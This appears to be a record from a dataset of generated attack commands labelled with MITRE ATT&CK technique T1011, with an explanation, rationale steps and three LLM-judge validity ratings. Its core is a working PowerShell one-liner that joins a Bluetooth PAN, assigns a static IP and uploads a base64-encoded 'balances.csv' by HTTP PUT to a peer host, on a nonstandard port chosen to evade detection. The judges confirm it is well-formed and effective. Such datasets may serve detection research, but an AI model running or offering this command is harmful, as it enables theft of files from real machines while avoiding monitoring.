command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The command is well-formed PowerShell with balanced quotes/braces, valid separators, and correctly structured cmdlets, pipelines, and hashtable headers.
llm_judgments.semantic_justification: It plausibly establishes a Bluetooth PAN, assigns a PAN IP, base64-encodes a file, and exfiltrates via HTTP to the PAN peer (matching T1011), but setting the IP typically requires admin privileges and the BluetoothCL '/connect ... NAP' usage may be tool-specific.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and appropriate use of variables and pipeline operations.
llm_judgments.semantic_justification: The command fully implements the T1011 technique by establishing a Bluetooth PAN connection to a specific MAC address, configuring a static IP on the Bluetooth interface, and exfiltrating base64-encoded file data over HTTP to a remote endpoint on a separate network medium.

llm_judgments.syntactic_justification: The Powershell command is perfectly well-formed, using correct syntax for cmdlet execution, variable assignment, .NET calls, native command execution, and parameter passing.
llm_judgments.semantic_justification: The command perfectly achieves the claimed intent by programmatically connecting to a Bluetooth NAP, configuring a dedicated IP address on the resulting PAN interface, and then exfiltrating data via HTTP PUT over this isolated Bluetooth network to a specific IP within that subnet, directly aligning with T1011.
